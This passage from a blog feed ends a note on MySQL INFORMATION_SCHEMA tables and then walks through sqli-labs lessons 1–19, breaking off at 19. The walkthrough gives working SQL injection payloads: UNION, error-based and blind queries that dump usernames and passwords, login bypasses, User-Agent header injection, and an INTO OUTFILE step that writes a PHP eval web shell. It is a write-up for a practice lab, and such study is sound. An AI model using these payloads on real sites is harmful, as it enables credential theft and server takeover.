：参数表存储了一些存储过程和方法的参数，以及存储过程的返回值信息。存储和方法在ROUTINES里面存储。</p><p>PLUGINS ：基本上是MySQL的插件信息，是否是活动状态等信息。其实SHOW PLUGINS本身就是通过这张表来拉取道德数据</p><p>ROUTINES：关于存储过程和方法function的一些信息，不过这个信息是不包括用户自定义的，只是系统的一些信息。</p><p>SCHEMATA：这个表提供了实例下有多少个数据库，而且还有数据库默认的字符集</p><p>TRIGGERS :这个表记录的就是触发器的信息，包括所有的相关的信息。系统的和自己用户创建的触发器。</p><p>VIEWS :视图的信息，也是系统的和用户的基本视图信息。</p><p>这些表存储的都是一些数据库的实体对象，方便我们进行查询和管理，对于一个DBA来说，这些表能够大大方便我们的工作，更快更方便的了结和查询数据库的相关信息。</p><h1 id="4：约束外键等相关的一些表"><a href="#4：约束外键等相关的一些表" class="headerlink" title="4：约束外键等相关的一些表"></a>4：约束外键等相关的一些表</h1><p>REFERENTIAL_CONSTRAINTS：这个表提供的外键相关的信息，而且只提供外键相关信息</p><p>TABLE_CONSTRAINTS ：这个表提供的是 相关的约束信息</p><p>INNODB_SYS_FOREIGN_COLS ：这个表也是存储的INNODB关于外键的元数据信息和SYS_FOREIGN_COLS 存储的信息是一致的</p><p>INNODB_SYS_FOREIGN ：存储的INNODB关于外键的元数据信息和SYS_FOREIGN_COLS 存储的信息是一致的，只不过是单独对于INNODB来说的</p><p>KEY_COLUMN_USAGE：数据库中所有有约束的列都会存下下来，也会记录下约束的名字和类别</p><p>为什么要把外键和约束单列出来呢，因为感觉这是一块独立的东西，虽然我们的生产环境大部分都不会使用外键，因为这会降低性能，但是合理的利用约束还是一个不错的选择，比如唯一约束。</p><h1 id="5：关于管理的一些的一些表"><a href="#5：关于管理的一些的一些表" class="headerlink" title="5：关于管理的一些的一些表"></a>5：关于管理的一些的一些表</h1><p>GLOBAL_STATUS ，GLOBAL_VARIABLES，SESSION_STATUS，SESSION_VARIABLES：这四张表分别记录了系统的变量，状态（全局和会话的信息），作为DBA相信大家也都比较熟悉了，而且这几张表也是在系统重启的时候回重新加载的。也就是内存表。</p><p>PARTITIONS ：MySQL分区表相关的信息，通过这张表我们可以查询到分区的相关信息（数据库中已分区的表，以及分区表的分区和每个分区的数据信息）</p><p>PROCESSLIST：show processlist其实就是从这个表拉取数据，PROCESSLIST的数据是他的基础。由于是一个内存表，所以我们相当于在内存中查询一样，这些操作都是很快的。</p><p>INNODB_CMP_PER_INDEX，INNODB_CMP_PER_INDEX_RESET：这两个表存储的是关于压缩INNODB信息表的时候的相关信息,有关整个表和索引信息都有.我们知道对于一个INNODB压缩表来说,不管是数据还是二级索引都是会被压缩的,因为数据本身也可以看作是一个聚集索引。</p><p>INNODB_CMPMEM ，INNODB_CMPMEM_RESET：这两个表是存放关于MySQL INNODB的压缩页的buffer pool信息，但是要注意一点的就是,用这两个表来收集所有信息的表的时候,是会对性能造成严重的影响的,所以说默认是关闭状态的。如果要打开这个功能的话我们要设置innodb_cmp_per_index_enabled参数为ON状态。</p><p>INNODB_BUFFER_POOL_STATS ：表提供有关INNODB 的buffer pool相关信息，和show engine innodb status提供的信息是相同的。也是show engine innodb status的信息来源。</p><p>INNODB_BUFFER_PAGE_LRU，INNODB_BUFFER_PAGE :维护了INNODB LRU LIST的相关信息</p><p>INNODB_BUFFER_PAGE ：这个表就比较屌了，存的是buffer里面缓冲的页数据。查询这个表会对性能产生很严重的影响，千万不要再我们自己的生产库上面执行这个语句，除非你能接受服务短暂的停顿</p><p>INNODB_SYS_DATAFILES ：这张表就是记录的表的文件存储的位置和表空间的一个对应关系(INNODB)</p><p>INNODB_TEMP_TABLE_INFO ：这个表惠记录所有的INNODB的所有用户使用到的信息，但是只能记录在内存中和没有持久化的信息。</p><p>INNODB_METRICS ：提供INNODB的各种的性能指数，是对INFORMATION_SCHEMA的补充，收集的是MySQL的系统统计信息。这些统计信息都是可以手动配置打开还是关闭的。有以下参数都是可以控制的：innodb_monitor_enable, innodb_monitor_disable, innodb_monitor_reset, innodb_monitor_reset_all。</p><p>INNODB_SYS_VIRTUAL :表存储的是INNODB表的虚拟列的信息，当然这个还是比较简单的，在MySQL 5.7中，支持两种Generated Column，即Virtual Generated Column和Stored Generated Column，前者只将Generated Column保存在数据字典中（表的元数据），并不会将这一列数据持久化到磁盘上；后者会将Generated Column持久化到磁盘上，而不是每次读取的时候计算所得。很明显，后者存放了可以通过已有数据计算而得的数据，需要更多的磁盘空间，与实际存储一列数据相比并没有优势，因此，MySQL 5.7中，不指定Generated Column的类型，默认是Virtual Column。</p><p>INNODB_CMP，INNODB_CMP_RESET：存储的是关于压缩INNODB信息表的时候的相关信息，详细请见推荐笔记。</p><p>为什么把这些表列为管理相关的表呢，因为我感觉像连接，分区，压缩表，innodb buffer pool等表，我们通过这些表都能很清晰的看到自己数据库的相关功能的状态，特别是我们通过一些变量更容易窥透MySQL的运行状态，方便我们进行管理。</p><h1 id="6：关于表信息和索引信息的一些表"><a href="#6：关于表信息和索引信息的一些表" class="headerlink" title="6：关于表信息和索引信息的一些表"></a>6：关于表信息和索引信息的一些表</h1><p>TABLES，TABLESPACES，INNODB_SYS_TABLES ，INNODB_SYS_TABLESPACES ：</p><p>TABLES这张表毫无疑问了，就是记录的数据库中表的信息，其中包括系统数据库和用户创建的数据库。show table status like ‘test1’\G的来源就是这个表；</p><p>TABLESPACES 却是标注的活跃表空间。 这个表是不提供关于innodb的表空间信息的，对于我们来说并没有太大作用，因为我们生产库是强制INNODB的；</p><p>INNODB_SYS_TABLES 这张表依赖的是SYS_TABLES数据字典中拉取出来的。此表提供了有关表格的格式和存储特性，包括行格式，压缩页面大小位级别的信息（如适用）</p><p>提供的是关于INNODB的表空间信息，其实和SYS_TABLESPACES 中的INNODB信息是一致的。</p><p>STATISTICS：这个表提供的是关于表的索引信息，所有索引的相关信息。</p><p>INNODB_SYS_INDEXES：提供相关INNODB表的索引的相关信息，和SYS_INDEXES 这个表存储的信息基本是一样的，只不过后者提供的是所有存储引擎的索引信息，后者只提供INNODB表的索引信息。</p><p>INNODB_SYS_TABLESTATS：</p><p>这个表就比较重要了，记录的是MySQL的INNODB表信息以及MySQL优化器会预估SQL选择合适的索引信息，其实就是MySQL数据库的统计信息</p><p>这个表的记录是记录在内存当中的，是一个内存表，每次重启后就会重新记录，所以只能记录从上次重启后的数据库统计信息。有了这个表，我们对于索引的维护就更加方便了，我们可以查询索引的使用次数，方便清理删除不常用的索引，提高表的更新插入等效率，节省磁盘空间。</p><p>INNODB_SYS_FIELDS ：这个表记录的是INNODB的表索引字段信息，以及字段的排名</p><p>INNODB_FT_CONFIG :这张表存的是全文索引的信息</p><p>INNODB_FT_DEFAULT_STOPWORD：这个表存放的是stopword 的信息,是和全文索引匹配起来使用的，和innodb的 INFORMATION_SCHEMA.INNODB_FT_DEFAULT_STOPWORD 是相同的，这个STOPWORD必须是在创建索引之前创建，而且必须指定字段为varchar。stopword 也就是我们所说的停止词，全文检索时，停止词列表将会被读取和检索，在不同的字符集和排序方式下，会造成命中失败或者找不到此数据，这取决于停止词的不同的排序方式。我们可以使用这个功能筛选不必要字段。</p><p>INNODB_FT_INDEX_TABLE：这个表存储的是关于INNODB表有全文索引的索引使用信息的，同样这个表也是要设置innodb_ft_aux_table以后才能够使用的，一般情况下是空的</p><p>INNODB_FT_INDEX_CACHE ：这张表存放的是插入前的记录信息，也是为了避免DML时候昂贵的索引重组</p><h1 id="7：关于MySQL优化相关的一些表"><a href="#7：关于MySQL优化相关的一些表" class="headerlink" title="7：关于MySQL优化相关的一些表"></a>7：关于MySQL优化相关的一些表</h1><p>OPTIMIZER_TRACE ：提供的是优化跟踪功能产生的信息.</p><p>PROFILING：SHOW PROFILE可以深入的查看服务器执行语句的工作情况。以及也能帮助你理解执行语句消耗时间的情况。一些限制是它没有实现的功能，不能查看和剖析其他连接的语句，以及剖析时所引起的消耗。</p><p>SHOW PROFILES显示最近发给服务器的多条语句，条数根据会话变量profiling_history_size定义，默认是15，最大值为100。设为0等价于关闭分析功能。详细信息请见MySQL profile</p><p>INNODB_FT_BEING_DELETED,INNODB_FT_DELETED: INNODB_FT_BEING_DELETED 这张表是INNODB_FT_DELETED的一个快照,只在OPTIMIZE TABLE 的时候才会使用。</p><h1 id="8：关于MySQL事物和锁的相关的一些表"><a href="#8：关于MySQL事物和锁的相关的一些表" class="headerlink" title="8：关于MySQL事物和锁的相关的一些表"></a>8：关于MySQL事物和锁的相关的一些表</h1><p>INNODB_LOCKS:现在获取的锁，但是不含没有获取的锁，而且只是针对INNODB的。</p><p>INNODB_LOCK_WAITS：系统锁等待相关信息，包含了阻塞的一行或者多行的记录，而且还有锁请求和被阻塞改请求的锁信息等。</p><p>INNODB_TRX：包含了所有正在执行的的事物相关信息（INNODB），而且包含了事物是否被阻塞或者请求锁。</p><p>我们通过这些表就能够很方便的查询出来未结束的事物和被阻塞的进程</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql Lab(1-20)</title>
      <link href="/2019/01/20/sql-lab(1-20)/"/>
      <url>/2019/01/20/sql-lab(1-20)/</url>
      
        <content type="html"><![CDATA[<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>输入单引号后报错，根据报错信息，可以确定输入参数的内容被存放到一对单引号中间<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-8ed303d5a01b939f.png" alt="图片.png"></p><p><strong>爆表：</strong><br>用到语句：<code>id=0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a99474d1e6d9f9be.png" alt="图片.png"></p><p><strong>爆列：</strong><br>用到语句：<code>id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-54ba0a1a12292d3c.png" alt="图片.png"></p><p><strong>爆值：</strong><br>用到语句：<code>id=0&#39; union select 1,group_concat(username,password),3 from users--+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-00b38aefa57a6f8e.png" alt="图片.png"><br><strong>注意：</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-9cf6bb03b0477ac3.png" alt="图片.png"><br>图中的3换成几都可以但不能为空，且前后这个地方出现的数应该一致</p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>输入单引号后报错，根据报错信息确定输入的内容被带入到数据库中，也可叫做数字型注入<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-7e7a4c12c424b668.png" alt="图片.png"><br><strong>爆表：</strong><br>用到语句：<code>id=0 union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database() --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-3cab721b2e202e91.png" alt="图片.png"></p><p><strong>爆列：</strong><br>用到语句：<code>id=0 union select 1,group_concat(column_name),2 from information_schema.columns where table_name=&#39;users&#39; --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-7f83edde0c4b3016.png" alt="图片.png"></p><p><strong>爆值：</strong><br>用到语句：<code>id=0 union select 1,group_concat(username,password),2 from users--+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-612b750803ecf8a9.png" alt="图片.png"></p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>输入单引号，根据报错信息确定输入的内容存放到一对单引号加圆括号中了<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-83785d69e3de34e7.png" alt="图片.png"><br><strong>爆表：</strong><br>用到语句：<code>id=0&#39;) union select 1,group_concat(table_name),1 from information_schema.tables where table_schema=database() --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-5fa39b2e6119da6c.png" alt="图片.png"></p><p><strong>爆列：</strong><br>用到语句：<code>id=0&#39;) union select 1,group_concat(column_name),1 from information_schema.columns where table_name=&#39;users&#39; --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-90097210a097385c.png" alt="图片.png"></p><p><strong>爆值：</strong><br>用到语句：<code>id=0&#39;) union select 1,group_concat(username,password),1 from users--+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-45a4648948d55d22.png" alt="图片.png"></p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>输入单引号没有报错，尝试输入双引号，页面报错，根据报错信息判断出输入的内容被放到一对双引号和圆括号中<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d06e9d9a3e47c19a.png" alt="图片.png"><br><strong>爆表：</strong><br>用到语句：<code>id=0&quot;) union select 1,group_concat(table_name),1 from information_schema.tables where table_schema=database() --+</code></p><p><strong>爆列：</strong><br>用到语句：<code>id=0&quot;) union select 1,group_concat(column_name),1 from information_schema.columns where table_name=&#39;users&#39; --+</code></p><p><strong>爆值：</strong><br>用到语句：<code>id=0&quot;) union select 1,group_concat(username,password),1 from users--+</code></p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>输入单引号报错，根据报错信息，可以确定输入参数的内容被存放到一对单引号中间<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-9de396b32526c0de.png" alt="图片.png"><br><strong>爆表：</strong><br>用到语句：<code>id=0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-43611833bd97c62e.png" alt="图片.png"><br>等等，好像不管用啊，是哪里出问题了吗？？UNION联合查询型注入不能用了…那试试布尔盲注，时间延迟型注入或者报错型注入,听说布尔和时间需要用sqlmap跑，那就试试报错注入吧</p><blockquote><p>爆表<br>用到语句：<code>?id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</code></p></blockquote><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-fd599c9ef18d8355.png" alt="tables.png"></p><blockquote><p>爆列<br>1<code>?id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+</code><br>2<code>?id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;,&#39;us&#39;,&#39;user&#39;,&#39;password&#39;,&#39;avatar&#39;,&#39;last_login&#39;)))) --+</code></p></blockquote><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-50753c0d2d4eabe8.png" alt="columns.png"><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-6ab70291c93b4346.png" alt="keepon.png"></p><blockquote><p>爆值<br>1<code>?id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+</code><br>2<code>?id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;I-kill-you&#39;))))--+</code></p></blockquote><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e59c6f140b120cad.png" alt="username.png"><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-91d3f63515795d7c.png" alt="keepon.png"></p><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>用双引号试完，发现<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-bec9171c36665288.png" alt="图片.png"><br>根据报错信息判断出输入的内容被放到一对双引号中<br>用报错注入，与less-5类似只是把id改成id&#x3D;1”即可</p><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>可能由于权限问题，一直写不进文件，在这里我简述一下方法，后续我会研究研究如何获取文件权限。<br>这道题是转储文件get字符型注入<br>通过payload 导入到指定的路径<br>导入：<br><code>Payload:?id=1&#39;)) union select 1,&#39;2&#39;,&#39;&lt;?php @eval($_POST[&quot;xx&quot;]);?&gt;&#39; into outfile &#39;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\1.txt&#39; %23</code><br>导出：<br><code>Payload:id=((&#39;1&#39;)) union select 1,load_file (&#39;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\1.txt&#39;),&#39;3&#39; #&#39;))</code></p><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>这一个和第七个其实差不多，主要就是把报错全部过滤了，如果错误就没有返回，正确就返回you are in……但是其实都一样，两个不同的返回可以利用基于布尔的盲注进行测试：</p><blockquote><p>盲注需要掌握一些MySQL的相关函数：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。*注意:这里的pos位置是从1开始的，不是数组的0开始</span><br><span class="line">mid(str,pos,len):跟上面的一样，截取字符串</span><br><span class="line"> ascii(str)：返回字符串str的最左面字符的ASCII代码值。</span><br><span class="line">ord(str):同上，返回ascii码</span><br><span class="line">if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</span><br></pre></td></tr></table></figure><blockquote><p>常见的ASCII，A:65,Z:90 a:97,z:122,  0:48, 9:57</p></blockquote><p>首先select database()查询数据库</p><p>ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码</p><p>ascii(substr((select database()),1,1))&gt;64：ascii大于64就返回true，if就返回1，否则返回0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select database()),1,1))&gt;64, 1, 0) %23</span><br></pre></td></tr></table></figure><p>或者这样就简单一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;64 %23</span><br></pre></td></tr></table></figure><p>猜数据库名：<br>由于脚本语言还没学习到，也不会使用工具，只好使用二分法。。一个漫长的过程。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;96 %23 返回正确，大于96</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&lt;123 %23 返回正确，小于123 ，区间在97-122 </span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;109 %23 返回正确，大于109，区间在110-122</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;116 %23 返回错误，所以在110-116之间</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;112 %23 返回正确，大于112，区间在113-116之间</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;114 %23 返回正确，大于114，间在115-116之间</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;115 %23 返回错误，不大于115，即第一个字母的ascii为115，即字母s</span><br></pre></td></tr></table></figure><p>剩下的方式同前面，这里就不叙述了</p><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>由于不管怎么输入都会被过滤，返回同一个结果，所以只能用时间延迟注入<br><code>payload:?id=1’ and sleep(5) %23</code><br><code>payload:?id=1’ and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23</code></p><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>同上，只是由单引号变为双引号<br><code>payload:?id=1” and sleep(5) %23</code><br><code>payload:?id=1” and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23</code></p><blockquote><p>11-20全都是POST型，可以使用抓包工具。</p></blockquote><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>错误的post单引号注入 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;a&#x27;&#x27; and password=&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p><code>payload-post:username=a ’ or 1=1 # &amp;password=xxxxx</code></p><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>错误的post双引号注入:<br>尝试输入a”<br>返回错误信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;a&quot;&quot;) and password=(&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p><code>payload-post:username=test “) or 1=1 # &amp;password=xxxxx</code></p><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>尝试输入a ’<br>返回错误信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;a&#x27;&#x27;) and password=(&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p><code>payload-post:username=test ‘) or 1=1 # &amp;password=xxxxx</code></p><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>尝试输入a”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;a&quot;&quot; and password=&quot;&quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p><code>payload-post:username=a&amp;password=a” or “1”=”1</code></p><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>bool型&#x2F;时间延迟单引号POST型盲注<br>这次输入’ “都没有错误<br>看了一下源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; </span><br><span class="line">$result=mysql_query($sql); </span><br><span class="line">$row = mysql_fetch_array($result); </span><br><span class="line">if($row)</span><br><span class="line">&#123; </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;;</span><br><span class="line"> &#125;</span><br><span class="line">else</span><br><span class="line">&#123; </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这是一个盲注，通过返回正确信息判断是否注入成功</p><blockquote><p>payload-post:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or &#x27;1&#x27;=&#x27;1 &amp;password=xxx</span><br><span class="line">username=&#x27; or 1=1 # &amp;password=xxx</span><br><span class="line">username=&#x27; or (length(database())) = 8 #&amp;password=xxx</span><br><span class="line">username=&#x27; or (ascii(substr((select database()) ,1,1))) = 115 #&amp;password=xxx</span><br></pre></td></tr></table></figure><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>bool型&#x2F;时间延迟的双引号POST型盲注<br>尝试输入 a”) or 1&#x3D;1 #<br>然后构造带有括号的注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=&quot;) or (&quot;1&quot;)=(&quot;1   &amp;passwd=xxx</span><br><span class="line">username=&quot;) or 1=1 or if(1=1, sleep(1), null)  # &amp;passwd=xxx</span><br><span class="line">username=&quot;) or (length(database())) = 8 # &amp;passwd=xxx</span><br><span class="line">username=&quot;) or (ascii(substr((select database()) ,1,1))) = 115  or if(1=1, sleep(1), null)  # &amp;passwd=xxx</span><br></pre></td></tr></table></figure><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>密码重置，源码见下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&#x27;uname&#x27;]); </span><br><span class="line">$passwd = check_input($_POST[&#x27;passwd&#x27;]);</span><br><span class="line"> @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;; </span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"> $row = mysql_fetch_array($result); </span><br><span class="line">if($row)</span><br><span class="line">&#123; </span><br><span class="line">$row1 = $row[&#x27;username&#x27;]; </span><br><span class="line">$update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; mysql_query($update);</span><br><span class="line"> if (mysql_error())</span><br><span class="line">&#123; </span><br><span class="line">print_r(mysql_error());</span><br><span class="line"> &#125;else</span><br><span class="line">&#123;  </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&#x27;; </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123; </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&#x27;; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看数据库，只需输入正确的用户名即可<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d557b1a6d12a1ad9.png" alt="图片.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload-post:</span><br><span class="line">username:admin &amp;passwd=xxx</span><br></pre></td></tr></table></figure><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&#x27;uname&#x27;]);</span><br><span class="line"> $passwd = check_input($_POST[&#x27;passwd&#x27;]);</span><br><span class="line"> $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line"> $result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1); </span><br><span class="line">if($row1)</span><br><span class="line">&#123; </span><br><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; </span><br><span class="line">mysql_query($insert); </span><br><span class="line">echo &#x27;Your User Agent is: &#x27; .$uagent; </span><br><span class="line">print_r(mysql_error()); </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;;</span><br><span class="line"> &#125;else</span><br><span class="line">&#123; </span><br><span class="line">print_r(mysql_error()); </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过查看源码看到，是一个insert的语句，通过构造updatexml xpath错误信息来返回数据<br>通过构造User-Agent<br><code>payload-header:User-Agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0&#39; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code></p><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>头部的Referer 